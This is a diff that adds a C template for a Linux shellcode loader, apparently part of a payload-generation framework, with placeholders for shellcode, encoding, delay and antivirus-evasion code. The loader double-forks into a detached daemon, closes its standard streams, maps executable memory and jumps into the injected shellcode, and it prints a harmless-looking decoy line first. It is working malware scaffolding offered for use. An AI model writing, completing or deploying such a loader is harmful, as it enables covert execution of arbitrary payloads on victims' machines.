@@ -1,0 +1,101 @@
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <unistd.h>
+#include <sys/wait.h>
+
+//####INCLUDE####
+
+//####DEFINE####
+
+//####CODE####
+
+
+void* esc_main(void* lpParameter)
+{
+    size_t length;
+    
+    // Replace this with your actual shellcode
+    const unsigned char raw[] = ####SHELLCODE####;
+    length = sizeof(raw);
+
+    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char) * length * 2);
+    memcpy(encoded, raw, length);
+
+    //####CALL####
+    
+    unsigned char* decoded = encoded;
+
+    // Double fork to create a daemon-like process
+    pid_t pid = fork();
+    
+    if (pid == 0) {
+        // First child process
+        
+        // Create new session to detach from parent's process group
+        if (setsid() == -1) {
+            perror("setsid");
+            exit(-1);
+        }
+        
+        // Fork again to ensure we're not a session leader
+        pid_t pid2 = fork();
+        
+        if (pid2 == 0) {
+            // Second child process - this will execute shellcode
+            
+            // Close standard file descriptors to fully detach
+            close(STDIN_FILENO);
+            close(STDOUT_FILENO);
+            close(STDERR_FILENO);
+            
+            // Memory allocation using mmap for Linux
+            void *exec = mmap(0, length, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+            if (exec == MAP_FAILED) {
+                exit(-1);
+            }
+
+            // Copy shellcode into allocated memory
+            memcpy(exec, decoded, length);
+
+            // Create a function pointer to execute the shellcode
+            void (*func)();
+            func = (void (*)())exec;
+            func();
+
+            // Free allocated memory
+            munmap(exec, length);
+            free(encoded);
+            
+            exit(0);
+        } else if (pid2 > 0) {
+            // First child exits immediately
+            exit(0);
+        } else {
+            // Second fork failed
+            exit(-1);
+        }
+    } else if (pid > 0) {
+        // Parent process - wait for first child to exit
+        int status;
+        waitpid(pid, &status, 0);
+        free(encoded);
+        return 0;
+    } else {
+        // First fork failed
+        perror("fork");
+        free(encoded);
+        return (void*)-1;
+    }
+}
+
+int main()
+{
+    //####DELAY####
+    //####EVASION####
+    //####ARGS####
+    printf("I love programming.");
+    esc_main(NULL);
+    return 3;
+}
